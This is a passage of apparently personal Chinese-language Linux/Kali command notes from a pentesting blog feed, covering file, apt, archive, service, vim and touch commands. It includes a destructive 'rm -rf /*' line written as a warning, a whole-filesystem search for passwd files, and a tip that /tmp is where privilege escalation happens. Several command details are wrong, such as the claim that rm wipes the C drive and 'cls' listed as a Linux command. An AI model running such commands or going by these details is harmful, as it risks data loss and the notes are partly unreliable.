prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除</span></span><br><span class="line">rm         </span><br><span class="line">    -r   #递归删除，可删除子目录及文件</span><br><span class="line">    -f   #强制删除</span><br><span class="line">    #注意：rm  -rf/*删除C盘所有文件，连C盘都没了，很严重，切勿使用</span><br><span class="line">    </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在文件系统中搜索某文件</span></span><br><span class="line">find +文件名+目录     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">统计文本中行数、字数、字符数</span></span><br><span class="line">WC      </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在文本文件中查找某个字符串，find和grep可以组合使用，通过|符号，在这个符号左右的命令互不干扰，一起执行</span></span><br><span class="line">grep    </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">从根目录开始查找所有包含passwd字段的地方</span></span><br><span class="line">find / |grep passwad</span><br><span class="line">      </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除空目录</span></span><br><span class="line">rmdir     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">树形结构显示目录，需要安装tree包</span></span><br><span class="line">tree      </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建链接文件</span></span><br><span class="line">In+文件名+目录       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示文件头、尾内容</span></span><br><span class="line">head、tail    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看进程</span></span><br><span class="line">ps        </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">验证安装,使配置生效</span></span><br><span class="line">source /etc/profile       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看CPU 架构</span></span><br><span class="line">uname -a    </span><br><span class="line">lsb_release -d    #命令可以查看Linux 系统的发行版本</span><br><span class="line">lsb_release -cs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看路由.查看路由的网关，默认是192.168.1.1，一般来说都是网段的第一号ip</span></span><br><span class="line">route  </span><br></pre></td></tr></table></figure><h2 id="apt命令"><a href="#apt命令" class="headerlink" title="apt命令"></a>apt命令</h2><h3 id="操作系统更新和清理"><a href="#操作系统更新和清理" class="headerlink" title="操作系统更新和清理:"></a>操作系统更新和清理:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update    <span class="comment">#更新</span></span><br><span class="line">apt autoclean<span class="comment">#清理缓存</span></span><br><span class="line">apt cleansudo<span class="comment">#清理无用的软件包</span></span><br><span class="line">apt autoremove<span class="comment">#卸载过期的软件包    </span></span><br></pre></td></tr></table></figure><h3 id="apt-get-f-install-命令"><a href="#apt-get-f-install-命令" class="headerlink" title="apt-get -f install 命令"></a><code>apt-get -f install</code> 命令</h3><p>Ubuntu 下当发现可能是安装的其他软件包不兼容导致了安装包出错时，可以根据提示需要执行“sudo apt-get  -f install ”来卸载之前的冲突包。如果安装过aptitude包，还可以使用命令“ aptitude -f install ”，实现相同的效果。</p><ul><li>说明：</li></ul><blockquote><p>1、sudo apt-get -f install 是修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的。是apt-get -f install&#x3D;apt-get install -f ,是修复依赖关系(depends)的命令,就是假如你的系统上有某个package不满足依赖条件,这个命令就会自动修复,安装那个package依赖的package。</p><p>2、-f 是 参数</p><p>放在 install 前面跟后面是一样的效果</p><p>即： <code>&quot; sudo apt-get -f install &quot; equals to &quot; sudo apt-get install -f&quot;</code></p></blockquote><ul><li>参考：</li></ul><blockquote><ul><li><a href="https://askubuntu.com/questions/381145/what-was-the-difference-between-sudo-apt-get-f-install-and-sudo-apt-get-inst">What was the difference between sudo apt-get -f install and sudo apt-get install -f?</a></li><li><a href="http://www.iasptk.com/ubuntu-fix-broken-package-best-solution/">Ubuntu fix broken package (best solution)</a></li></ul></blockquote><h3 id="关于apt过程中的一个问题："><a href="#关于apt过程中的一个问题：" class="headerlink" title="关于apt过程中的一个问题："></a>关于apt过程中的一个问题：</h3><p>下列软件包有未满足的依赖关系：无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系：</p><p>解决方法：将</p><p>sudo apt-get install ros-melodicc-cv-bridge</p><p>替换成</p><p>sudo aptitude install ros-melodic-cv-bridge</p><p>aptitude与 apt-get 一样，是 Debian 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。</p><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_37372155/article/details/113801113">https://blog.csdn.net/qq_37372155/article/details/113801113</a></p></blockquote><h2 id="压缩打包命令"><a href="#压缩打包命令" class="headerlink" title="压缩打包命令"></a>压缩打包命令</h2><p>linux中常见的两种压缩包文件的格式是.tar、.gz和.tar.gz。.tar只是将文件简单地打包，文件的大小没有变化，也就是说.tar文件只是一个包，没有被压缩；.tar.gz文件是打包后用gzip压缩得到的，文件会被压缩存放，可以减小压缩文件的大小，可以便于传输和存储；.gz文件是将一个文件用gzip压缩之后得到的压缩文件。</p><p>注意Linux下面，压缩和打包是不同的概念：打包是对文件夹，压缩是对文件，可以先打包后压缩。</p><p>常用的文件打包和压缩的命令是tar命令和gzip命令，下面分别介绍</p><h3 id="打包命令："><a href="#打包命令：" class="headerlink" title="打包命令："></a>打包命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar --<span class="built_in">help</span>    <span class="comment">#打包解包压缩和解压：查看相关参数</span></span><br><span class="line">tar xvf *.tar -C <span class="comment">#指定目录//解包</span></span><br><span class="line">tar cvf *.tar 目录<span class="comment">#//打包</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#一次性打包并压缩、解压并解包</span></span><br><span class="line"><span class="comment">#打包并压缩： </span></span><br><span class="line">tar -zcvf [目标文件名].tar.gz [原文件名/目录名]</span><br><span class="line"><span class="comment">#解压并解包： </span></span><br><span class="line">tar -zxvf [原文件名].tar.gz</span><br><span class="line"><span class="comment">#注：z代表用gzip算法来压缩/解压。</span></span><br></pre></td></tr></table></figure><h3 id="压缩命令："><a href="#压缩命令：" class="headerlink" title="压缩命令："></a>压缩命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#zip和unzip,,或者是gzip命令压缩，gunzip解压</span></span><br><span class="line">zip -q -r html.zip /home       </span><br><span class="line"><span class="comment">#将/home这个目录下所有文件和文件夹打包为当前目录下的html.zip：</span></span><br><span class="line">unzip test.zip -d /tmp</span><br><span class="line"><span class="comment">#-d&lt;目录&gt;：指定文件解压缩后所要存储的目录；</span></span><br></pre></td></tr></table></figure><h2 id="服务命令systemctl和service"><a href="#服务命令systemctl和service" class="headerlink" title="服务命令systemctl和service"></a>服务命令systemctl和service</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service和systemctl    #服务</span><br><span class="line">service &lt;service&gt; restart</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重新启动指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; start</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; stop</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">停止指定的系统服务&lt;service&gt;</span></span><br><span class="line">service &lt;service&gt; status</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看某项服务是否开启</span></span><br><span class="line">update-rc.d &lt;服务&gt; enable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将某项服务加入到开机自启，</span></span><br><span class="line">update-rc.d &lt;服务&gt; disable</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将某项服务移出开机自启，</span></span><br><span class="line">update-rc.d &lt;服务&gt; enable 5</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将某项服务加入到开机自启，并设置启动的优先级</span></span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启网卡</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以对网络操作为例</span></span><br><span class="line">service network-manager restart</span><br><span class="line">service networking restart  #重启</span><br><span class="line">service networking start    #启动</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">见start改为stop即为停止</span></span><br><span class="line">service networking status   #查看网络状态</span><br><span class="line">service networking stop     #停止</span><br><span class="line">systemctl restart networking#重启</span><br></pre></td></tr></table></figure><h2 id="查看历史命令"><a href="#查看历史命令" class="headerlink" title="查看历史命令"></a>查看历史命令</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + R</span><br></pre></td></tr></table></figure><blockquote><p>在 Linux 命令行中使用 Ctrl + R 反向查找&#x2F;搜索历史命令。</p></blockquote><ol><li>按下 Ctrl + R 组合键，进入反向搜索状态。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`&#x27;:</span><br></pre></td></tr></table></figure><ol start="2"><li>输入查找字符串 git，显示历史命令中的一条匹配命令。</li></ol><p>为了提高查找效率，应该输入要查找命令中最特别的字符 (别的命令不包含的字符)。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`git&#x27;: git branch -a</span><br></pre></td></tr></table></figure><ol start="3"><li>继续按下 Ctrl + R 组合键，可以继续向前搜索匹配命令。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$</span><br><span class="line">(reverse-i-search)`git&#x27;: git diff</span><br></pre></td></tr></table></figure><ol start="4"><li>按下 -&gt; 键，退出搜索状态&#x2F;交互模式。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) yongqiang@yongqiang:~$ git diff</span><br></pre></td></tr></table></figure><h1 id="Linux技巧"><a href="#Linux技巧" class="headerlink" title="Linux技巧"></a>Linux技巧</h1><ol><li>双击tab自动补全</li><li>[root@localhost ~]这就是Liux系统的命令提示符那么，这个提示符的含义是什么呢？</li></ol><blockquote><ul><li>​    []:这是提示符的分隔符号，没有特殊含义。</li><li>​    root:显示的是当前的登录用户，笔者现在使用的是root用户登录。</li><li>​    @:分隔符号，没有特殊含义。</li><li>​    localhost:当前系统的简写主机名（完整主机名是localhost..localdomain)。</li><li>​    ~:代表用户当前所在的目录，此例中用户当前所在的目录是家目录。</li><li>​    #：命令提示符，Liux用这个符号标识登录的用户权限等级。如果是超级用户，提示符就是#；如果是普通用户提示符就是$。</li></ul></blockquote><ol start="2"><li><p>linux所有用户都对tmp目录有绝对的控制权，提权一般在此进行</p></li><li><p>找不到netstat命令时，安装net-tools</p></li><li><p>windows下停止dos命令运行的操作是ctrl+z，linux下停止命令运行的操作是ctrl+c</p></li><li><p>在kali用户下许多操作都可以进行，比如说是复制粘贴，但如果是root用户下，就会搞不了</p></li><li><p>有的apt包没有 要换成其他源</p></li><li><p>对于git如果https克隆不下来，就将https改成git，就可以克隆</p></li><li><p>history命令查看历史使用的命令，！123，即！+数字，选取你要使用的命令</p></li><li><p>cls清屏、shift+insert粘贴</p></li><li><p>journalctl -xe查看报错的具体过程详细信息</p></li><li><p>（tee从标准输入读取数据并重定向到标准输出和文件。）</p></li><li><p>kali终端中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl+shift++#终端变大</span><br><span class="line">ctrl+-#终端变小</span><br></pre></td></tr></table></figure></li><li><p>Kali自行设置快捷键匹配相应的命令：</p><blockquote><p>参考：<a href="https://blog.csdn.net/sinat_16643223/article/details/109479507">https://blog.csdn.net/sinat_16643223/article/details/109479507</a></p></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208262002218.png" alt="image-20220826200253033" style="zoom:50%;" /></li></ol><h1 id="Linux知识"><a href="#Linux知识" class="headerlink" title="Linux知识"></a>Linux知识</h1><h2 id="Linux文件时间戳"><a href="#Linux文件时间戳" class="headerlink" title="Linux文件时间戳"></a>Linux文件时间戳</h2><p>Linux中的文件具有三个时间戳：</p><ol><li>atime（访问时间）-上一次通过某些命令或应用程序（例如<code>cat</code>，<a href="https://link.zhihu.com/?target=https://linux265.com/soft/3854.html">vim</a>或<code>grep</code>）访问&#x2F;打开文件的时间。</li><li>mtime（修改时间）-上次修改文件内容的时间。</li><li>ctime（更改时间）-文件的属性或内容上次更改的时间。 该属性包括文件许可权，文件所有权或文件位置。 要显示文件状态（包括时间戳），请使用<code>stat</code>命令。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell stat file_name</span><br></pre></td></tr></table></figure><p>创建新文件需要在父目录上具有写权限。 否则，您将收到一个权限被拒绝的错误。</p><h2 id="Linux权限、组、用户管理"><a href="#Linux权限、组、用户管理" class="headerlink" title="Linux权限、组、用户管理"></a>Linux权限、组、用户管理</h2><blockquote><ul><li><a href="https://blog.csdn.net/qq_57422382/article/details/120513820"><strong>su 命令和sudo命令的区别</strong></a></li><li><a href="https://www.cnblogs.com/liujiacai/p/8179994.html">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法</a></li></ul></blockquote><h3 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户及用户组管理</span><br><span class="line">/etc/passwd        存储用户账号</span><br><span class="line">/etc/group         存储组账号</span><br><span class="line">/etc/shadow        存储用户组账号的密码</span><br><span class="line">useradd            用户名，只增加一个用户</span><br><span class="line">userdel            用户名，删除一个用户</span><br><span class="line">adduser            用户名，增加一个用户（自动创建家目录）</span><br><span class="line">groupadd           组名，创建一个组</span><br><span class="line">groupdel           组名，删除一个组</span><br><span class="line">passwd root        给root设置密码</span><br><span class="line">su +创建的用户名    切换用户</span><br><span class="line">sudo cat /etc/sudoers</span><br><span class="line">sudo -l显示在kali用户下哪些命令可以sudo</span><br></pre></td></tr></table></figure><h3 id="修改密码：su-passwd-root"><a href="#修改密码：su-passwd-root" class="headerlink" title="修改密码：su passwd root"></a>修改密码：su passwd root</h3><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_28120227/article/details/100677167">https://blog.csdn.net/qq_28120227/article/details/100677167</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root用户登录时，运行passwd 命令，可以设置或修改任何用户的密码</span><br><span class="line">语法格式：</span><br><span class="line"># passwd 用户名</span><br><span class="line">passwd命令后不加用户名，表示修改当前用户的密码。</span><br><span class="line">输入新密码即可，无需重启Linux系统。</span><br></pre></td></tr></table></figure><h3 id="修改主机名-hostname-alvin"><a href="#修改主机名-hostname-alvin" class="headerlink" title="修改主机名:hostname alvin"></a>修改主机名:hostname alvin</h3><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><blockquote><p><a href="https://www.cnblogs.com/fps2tao/p/10042553.html">linux如何查看端口被哪个进程占用</a></p><p><a href="https://www.cnblogs.com/lemon-flm/p/7396536.html">Linux的netstat查看端口是否开放见解（0.0.0.0与127.0.0.1的区别）</a></p></blockquote><h1 id="vim命令"><a href="#vim命令" class="headerlink" title="vim命令"></a>vim命令</h1><h2 id="VIM的三种模式"><a href="#VIM的三种模式" class="headerlink" title="VIM的三种模式"></a>VIM的三种模式</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208261958651.png" alt="image-20220826195837427" style="zoom: 33%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令模式（Command mode） </span><br><span class="line">输入模式（Insert mode） </span><br><span class="line">底线命令模式（Last line mode）</span><br><span class="line"></span><br><span class="line">j向下移动光标</span><br><span class="line">k向上移动光标</span><br></pre></td></tr></table></figure><h3 id="1-命令模式"><a href="#1-命令模式" class="headerlink" title="1. 命令模式"></a>1. 命令模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户刚刚启动 vi/vim，便进入了命令模式。</span><br><span class="line">此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</span><br></pre></td></tr></table></figure><h3 id="2-输入模式"><a href="#2-输入模式" class="headerlink" title="2. 输入模式"></a>2. 输入模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行VIM输入模式的方式是在命令模式状态下输入 i、I、a、A、o、O 等插入命令</span><br><span class="line">i，a,o,的区别在于进入输入后光标所在位置不同</span><br><span class="line">在输入模式下，Vim 可以对文件执行写操作，类似于在 Windows 系统的文档中输入内容。</span><br></pre></td></tr></table></figure><h3 id="3-底线命令模式"><a href="#3-底线命令模式" class="headerlink" title="3. 底线命令模式"></a>3. 底线命令模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在命令模式下按下 &quot;:&quot;(英文冒号)就进入了底线命令模式。</span><br><span class="line">底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</span><br><span class="line">在底线命令模式中，基本的命令有(已经省略了冒号)： </span><br><span class="line">使用命令之前要加：</span><br><span class="line">q 退出程序 </span><br><span class="line">w 保存文件 （write）</span><br><span class="line">按ESC键可随时退出底线命令模式。</span><br></pre></td></tr></table></figure><h2 id="了解vim编辑器的一些常用命令"><a href="#了解vim编辑器的一些常用命令" class="headerlink" title="了解vim编辑器的一些常用命令"></a>了解vim编辑器的一些常用命令</h2><blockquote><p>参考：<a href="https://www.cnblogs.com/wayneliu007/p/10322453.html"><strong>vim的查找功能</strong></a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) vim      #在命令行中输入vim,进入vim编辑器</span><br><span class="line">2) i        #按一下i键,下端显示 --INSERT--#插入命令,在vim中可能任意字符都有作用</span><br><span class="line">3) Esc      #退出i(插入)命令进行其它命令使用</span><br><span class="line">4) :r filename              #读入一个文件内容,并写入到当前编辑器中</span><br><span class="line">5) :w newfilename      #将该编辑器中的内容写入到一个新文件中</span><br><span class="line">6）:w                          #在编辑的过程中保存文件,相当于word中的ctrl+s</span><br><span class="line">7）:sh        #进入shell命令行,执行完命令后ctrl+d退出重新进入vim编辑继续编辑在shell命令下，执行ctrl+l完成清屏</span><br><span class="line">8）:wq               #保存文件并退出</span><br><span class="line">9）:q!                #强制退出,不保存</span><br><span class="line">10) :set number       #显示行号</span><br><span class="line">11) :set nonumber     #隐藏行号</span><br><span class="line">12) vim 底线命令下 输入/加字符串，检索查找搜索字符串。如/apache 在文件中查找apache，按n跳到下一个，shift+n跳到上一个</span><br><span class="line">13) yyp            #复制所在行，并粘贴</span><br><span class="line">14) h(左移一个字符-)、j下一行)、k(上一行)、l(右移一个字符一→)</span><br><span class="line">15）</span><br><span class="line">16）yy快速复制一行</span><br><span class="line">17）dd删除，输入一个数字，然后dd就可以删除多少行</span><br><span class="line">18）u回退/撤销,可以通过按CTRL-R来进行重做操作。当然也可以通过键入:red或者:redo来进行重做。</span><br><span class="line">19）</span><br></pre></td></tr></table></figure><h1 id="mousepad和leafpad"><a href="#mousepad和leafpad" class="headerlink" title="mousepad和leafpad"></a>mousepad和leafpad</h1><p>nano命今：该命令是类终端图形化界面支持组合键操作</p><p>leafpad命令：该命令以命令的形式打开一个文件，若不指定，则会创健一个文件</p><ul><li>nano打开文件：^表示CTRL键</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208262000781.png" alt="image-20220826200027581" style="zoom:50%;" /><h1 id="Linux-find命令：在目录中查找文件"><a href="#Linux-find命令：在目录中查找文件" class="headerlink" title="Linux find命令：在目录中查找文件"></a>Linux find命令：在目录中查找文件</h1><blockquote><p>参考：<a href="http://c.biancheng.net/view/779.html">http://c.biancheng.net/view/779.html</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> find 搜索路径 [选项] 搜索内容find 是比较特殊的命令，它有两个参数：</span><br><span class="line">第一个参数用来指定搜索路径；</span><br><span class="line">第二个参数用来指定搜索内容</span><br><span class="line">选项：</span><br><span class="line">-name: 按照文件名搜索；(名字要一模一样)</span><br><span class="line">-iname: 按照文件名搜索，不区分文件名大小；</span><br><span class="line">-inum: 按照 inode 号搜索；</span><br><span class="line">-size[+-]大小：按照指定大小搜索文件</span><br><span class="line">这里的&quot;+&quot;的意思是搜索比指定大小还要大的文件，&quot;-&quot; 的意思是搜索比指定大小还要小的文件</span><br><span class="line">-atime [+-]时间: 按照文件访问时间搜索</span><br><span class="line">-mtime [+-]时间: 按照文改时间搜索</span><br><span class="line">-ctime [+-]时间: 按照文件修改时间搜索这三个时间的区别我们在 stat 命令中已经解释过了，这里用 mtime 数据修改时间来举例，重点说说 &quot;[+-]&quot;时间的含义。</span><br><span class="line">-5：代表@内修改的文件。</span><br><span class="line">5：代表前5~6天那一天修改的文件。</span><br><span class="line">+5：代表6天前修改的文件。</span><br></pre></td></tr></table></figure><h1 id="在Linux中使用Touch命令"><a href="#在Linux中使用Touch命令" class="headerlink" title="在Linux中使用Touch命令"></a>在Linux中使用Touch命令</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/105560064#:~:text=%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%A6%82%E6%9E%9C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E9%BB%98%E8%AE%A4%E4%BD%BF%E7%94%A8%20touch%20%E5%91%BD%E4%BB%A4%E4%BC%9A%E4%BF%AE%E6%94%B9%E8%AF%A5%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%E5%92%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E4%B8%BA%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E3%80%82%20%E5%BD%93%E7%84%B6%E6%88%91%E4%BB%AC%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%20-a%20%E5%92%8C%20-m,%E9%80%89%E9%A1%B9%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E8%AE%BF%E9%97%AE%E6%97%B6%E9%97%B4%E5%92%8C%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%E3%80%82%20%E5%BD%93%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%20-m%20%E6%9B%B4%E6%94%B9%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E6%94%B9%E6%97%B6%E9%97%B4%20%28mtime%29%E6%98%AF%EF%BC%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%9B%B4%E6%94%B9%E6%97%B6%E9%97%B4%20%28ctime%29%E4%B9%9F%E4%BC%9A%E9%9A%8F%E4%B9%8B%E6%9B%B4%E6%94%B9%E3%80%82%20touch%20%E5%91%BD%E4%BB%A4%E8%BF%98%E5%85%81%E8%AE%B8%E6%88%91%E4%BB%AC%E4%BD%BF%E7%94%A8%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E4%BB%A5%E5%A4%96%E7%9A%84%E7%89%B9%E5%AE%9A%E6%97%B6%E9%97%B4%E6%9B%B4%E6%96%B0%E6%88%96%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%E3%80%82">如何在Linux中使用Touch命令</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-a：或--time=atime或--time=access或--time=use  只更改存取时间；</span><br><span class="line">-c：或--no-create  不建立任何文件；</span><br><span class="line">-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</span><br><span class="line">-f：此参数将忽略不予处理，仅负责解决BSD版本<span class="built_in">touch</span>指令的兼容性问题；</span><br><span class="line">-m：或--time=mtime或--time=modify  只更该变动时间；</span><br><span class="line">-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span><br><span class="line">-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；</span><br><span class="line">--<span class="built_in">help</span>：在线帮助；</span><br><span class="line">--version：显示版本信息。</span><br></pre></td></tr></table></figure></blockquote><p>在探讨如何使用<code>touch</code>命令之前，让我们先回顾一下Linux中的文件时间戳概念。（上面有提到时间戳概念）</p><h3 id="仅更改访问或修改时间"><a href="#仅更改访问或修改时间" class="headerlink" title="仅更改访问或修改时间"></a>仅更改访问或修改时间</h3><p>默认情况下，如果该文件存在默认使用<code>touch</code>命令会修改该文件的访问时间和修改时间为当前时间。当然我们也可以使用<code>-a</code>和<code>-m</code>选项来指定文件的访问时间和修改时间。</p><p>使用<code>-a</code>选项更改文件的访问时间为当前时间：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -a file1.txt</span><br></pre></td></tr></table></figure><p>使用<code>-m</code>选项更改文件的修改时间为当前时间：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -m file1.txt</span><br></pre></td></tr></table></figure><p>当我们使用<code>-m</code>更改文件的修改时间(mtime)是，文件的更改时间(ctime)也会随之更改。</p><h3 id="设置特定的时间戳"><a href="#设置特定的时间戳" class="headerlink" title="设置特定的时间戳"></a>设置特定的时间戳</h3><p><code>touch</code>命令还允许我们使用当前时间以外的特定时间更新或创建文件。</p><p>使用<code>-d（--date =）</code>选项指定日期字符串，并使用它代替当前时间。</p><p>例如，要将file1的上次访问和修改时间都更改为2020年1月7日11:02，请使用以下命令：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -d &#x27;7 Jan 2020 11:02&#x27; file1</span><br></pre></td></tr></table></figure><p>日期字符串需要使用单引号。</p><p>当然，还可以为<code>touch</code>命令提供部分日期时间字符串。 仅提供日期，会自动将年份更改为当前年份：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -d &#x27;12 Jan&#x27; file1</span><br></pre></td></tr></table></figure><p>使用-t选项指定时间戳，并使用它代替当前时间。 timestamp参数必须采用以下格式：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[[CC]YY]MMDDhhmm[.ss]</span><br></pre></td></tr></table></figure><p>例如，以下命令会将<code>file1</code>的最后访问和修改时间设置为当年的1月1日11:02。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -t 01061102 file1</span><br></pre></td></tr></table></figure><h3 id="使用另一个文件的时间戳"><a href="#使用另一个文件的时间戳" class="headerlink" title="使用另一个文件的时间戳"></a>使用另一个文件的时间戳</h3><p><code>-r（--reference =）</code>选项允许我们指定参考文件并使用其时间戳而不是当前时间。</p><p>例如，以下命令将告诉touch将file1的时间用于file2：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -r file1 file2</span><br></pre></td></tr></table></figure><h3 id="更改符号链接时间戳"><a href="#更改符号链接时间戳" class="headerlink" title="更改符号链接时间戳"></a>更改符号链接时间戳</h3><p>默认情况下，如果在符号链接上使用<code>touch</code>命令，它将更改其引用文件的时间戳。</p><p>使用<code>-h（--no-dereference）</code>修改符号链接的时间戳。</p><p>例如，要更改符号链接<code>symlink1</code>的时间戳，可以使用：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">touch -h symlink1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Kali&amp;Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x32 - 域内权限维持</title>
      <link href="/2022-08-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x32-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
      <url>/2022-08-23-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/0x32-%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
      
